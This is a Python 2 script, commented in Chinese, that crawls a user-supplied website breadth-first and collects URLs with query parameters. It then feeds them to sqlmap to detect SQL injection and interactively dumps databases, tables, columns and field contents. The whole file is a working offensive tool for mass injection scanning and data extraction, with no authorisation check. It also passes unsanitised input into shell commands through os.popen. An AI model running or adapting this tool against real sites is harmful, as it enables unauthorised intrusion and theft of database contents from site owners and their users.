#!/opt/yrd_soft/bin/python
# -*- coding: utf-8 -*-

import re #匹配正则表达式
import requests #获取url页面内容
import lxml #辅助解析html
from bs4 import BeautifulSoup #解析html
import os #用于调用系统命令

host = raw_input('请输入域名(如http://www.90xsxt.net/):')

def print_bfs(url): #采用广度优先搜索算法
    """
    Print all links reachable from a starting **url**
    in breadth-first order
    """
    #已经访问过的链接
    has_trace_bfs = [url] #列表数据类型
    equalList = []
    lastEqualValueList = [] #筛选不同参数的url
    level = 0 #定义初始节点的层为0
    level_links = {} #字典数据类型
    level_links[level] = [url] #一层的url

    #level存在且所对应的url不为空
    while(level_links.has_key(level) and len(level_links[level]) != 0):
        for link in level_links[level]: #将该层的url取出
            print '正在查找页面 ' + link + ' 包含的链接'
            links = getLinks(link) #获取该url下所包含的链接
            for i in range(len(links)): #循环收集该层所有链接
                if not links[i] in has_trace_bfs: #如果这个链接不在已追踪表里面，则放入下一层
                    if level_links.has_key(level+1):
                        level_links[level+1].append(links[i])
                    else:
                        level_links[level+1] = [links[i]]
                    has_trace_bfs.append(links[i])
        level = level + 1

    for i in range(len(has_trace_bfs)):
        has_trace_bfs[i] += '\n' #一行一个url输出
        if has_trace_bfs[i].find('=') != -1: #若匹配到=，则放入另一个文件
            #筛选不同参数的url
            left = has_trace_bfs[i].rfind('/') + 1
            right = has_trace_bfs[i].rfind('?')
            if has_trace_bfs[i][left:right] in lastEqualValueList:
                continue
            else:
                lastEqualValueList.append(has_trace_bfs[i][left:right])
                equalList.append(has_trace_bfs[i])

    f1=file("results.txt","w+")#清空后写入全部url
    f1.writelines(has_trace_bfs)
    f1.close()
    f2=file("important urls.txt","w+")#清空后写入所有包含'='号的url,作为下一步的输入
    f2.writelines(equalList)
    f2.close()


def getLinks(url):
    result = []
    try:
        #获取链接页面内容，设置超时时间为10s
        page=requests.get(url,timeout=10).text
    except:
        return result

    #将上一级目录截取出来
    directory = ''
    index = url.rfind('/')
    if -1 != index:
        directory = url[:index+1]

    #解析拿到页面，根据标签和属性来获取链接
    pagesoup=BeautifulSoup(page,'lxml')
    for link in pagesoup.find_all(name='a'):
        href = link.get('href')
        if href == None:
            continue
        href = href.encode('ascii','ignore')#转码
        m = re.match(r'^http', href)
        if m:
            #过滤掉其他域名，如http://www.baidu.com/（不属于本站链接）
            if re.match(host,href):
                result.append(href)
        else:
            #相对地址则要添加域名
            if re.match(r'^/',href):
                result.append(host+href)
            else:
                result.append(directory + href)
    return result


#启动sqlmap基本语句
base_command = 'python ./sqlmap.py --batch -u "%s"'

#显示字段
def show_fields(url):

    #输入数据库名、表名、字段名
    dbname = raw_input("input database name:")
    tbname = raw_input("input table name:")
    colname = raw_input("input columns name to dump:")
    print 'fetching %s/%s %s' % (dbname, tbname, colname)

    #执行命令
    output = os.popen(base_command % url + " -D %s -T %s -C %s --dump" %
                      (dbname, tbname, colname)).read()

    #查询输出结果起始位置
    l = output.find('Database: %s' % dbname)
    if l == -1:
        return False
    output = output[l:]
    #结束位置
    r = output.find('\n\n')
    if r == -1:
        return False
    print '-' * 40
    #输出结果
    print output[:r]
    print '-' * 40
    return True

#显示列
def show_columns(url):
    dbname = raw_input("input database name:")
    tbname = raw_input("input table name to show columns:")
    print 'fetching %s/%s...' % (dbname, tbname)
    output = os.popen(base_command % url + " -D %s -T %s --columns" %
                      (dbname, tbname)).read()
    l = output.find('Database: %s' % dbname)
    if l == -1:
        return False
    output = output[l:]
    r = output.find('\n\n')
    if r == -1:
        return False
    print '-' * 40
    print output[:r]
    print '-' * 40
    return True

#显示表
def show_tables(url):
    dbname = raw_input("input database name to show tables:")
    print 'fetching %s...' % dbname
    output = os.popen(base_command % url + " -D %s --tables" % dbname).read()
    l = output.find('Database: %s' % dbname)
    if l == -1:
        return False
    output = output[l:]
    r = output.find('\n\n')
    if r == -1:
        return False
    print '-' * 40
    print output[:r]
    print '-' * 40
    return True

#显示数据库
def show_dbs(url):
    print('running...')
    output = os.popen(base_command % url + " --dbs").read()
    l = output.find('available databases')
    if l == -1:
        return False
    output = output[l:]
    r = output.find('\n\n')
    if r == -1:
        return False
    print '-' * 40
    print output[:r]
    print '-' * 40
    return True

#注入检测
def injection_detect(url):
    print('testing %s' % url)
    output = os.popen(base_command % url).read()
    print output
    l, r = output.find('---'), output.rfind('---')
    if l != -1 and r != -1:
        print '-' * 40
        print output[l+4:r]
        print '-' * 40
        return True
    else:
        print 'can not inject...'
        return False

#批量检测
def batch_tester():

    #打开文件逐一读取注入点进行检测
    with open('important urls.txt', 'r') as f:
        for url in f:

            #flag==True可注入
            url = url.strip('\n')
            flag = injection_detect(url)
            while flag:
                opt = raw_input(
                    '''
input your choice:
    'd' to show databases.
    't' to show tables.
    'c' to show columns.
    'f' to show fields.
    'ct' to continue.
    'q' to quit.
'''
                )
                if opt == 'd':
                    show_dbs(url)
                elif opt == 't':
                    if not show_tables(url):
                        print 'not found!'
                elif opt == 'c':
                    if not show_columns(url):
                        print 'not found!'
                elif opt == 'f':
                    if not show_fields(url):
                        print 'not found!'
                elif opt == 'ct':
                    break
                elif opt == 'q':
                    return
                else:
                    print 'input error!'


if __name__ == "__main__": #为了方便重用，以后要用的话直接import即可

    print_bfs(host)
    batch_tester()
